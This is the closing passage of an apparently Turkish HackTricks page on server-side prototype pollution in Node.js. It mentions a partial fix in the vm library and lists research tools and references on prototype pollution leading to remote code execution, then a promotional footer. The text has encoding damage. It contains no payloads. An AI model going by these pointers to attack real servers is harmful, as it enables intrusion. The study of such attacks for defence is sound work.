[**Bu taahhÃ¼t**](https://github.com/nodejs/node/commit/0313102aaabb49f78156cadc1b3492eac3941dd9) ile vm kÃ¼tÃ¼phanesinden **`contextExtensions`**'Ä±n prototip kirliliÄŸi de **`{}`** yerine **`kEmptyObject`** olarak ayarlanarak **bir nevi dÃ¼zeltildi**.

### **DiÄŸer AraÃ§lar**

* [https://github.com/yuske/server-side-prototype-pollution](https://github.com/yuske/server-side-prototype-pollution)
* [https://github.com/KTH-LangSec/server-side-prototype-pollution](https://github.com/KTH-LangSec/server-side-prototype-pollution)

## Referanslar

* [https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/](https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/)
* [https://blog.sonarsource.com/blitzjs-prototype-pollution/](https://blog.sonarsource.com/blitzjs-prototype-pollution/)
* [https://arxiv.org/pdf/2207.11171.pdf](https://arxiv.org/pdf/2207.11171.pdf)
* [https://portswigger.net/research/server-side-prototype-pollution](https://portswigger.net/research/server-side-prototype-pollution)

<details>

<summary><strong>SÄ±fÄ±rdan kahraman olmak iÃ§in AWS hackleme Ã¶ÄŸrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks'Ä± desteklemenin diÄŸer yollarÄ±:

* **Åirketinizi HackTricks'te reklamÄ±nÄ± gÃ¶rmek veya HackTricks'i PDF olarak indirmek istiyorsanÄ±z** [**ABONELÄ°K PLANLARI**](https://github.com/sponsors/carlospolop)'na gÃ¶z atÄ±n!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini alÄ±n**](https://peass.creator-spring.com)
* [**The PEASS Family'yi**](https://opensea.io/collection/the-peass-family) keÅŸfedin, Ã¶zel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* **ğŸ’¬ [Discord grubuna](https://discord.gg/hRep4RUj7f) veya [telegram grubuna](https://t.me/peass) katÄ±lÄ±n veya bizi Twitter'da** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks\_live)** takip edin.**
* **Hacking pÃ¼f noktalarÄ±nÄ±zÄ± paylaÅŸarak HackTricks ve HackTricks Cloud github depolarÄ±na PR gÃ¶ndererek destek olun.**

</details>
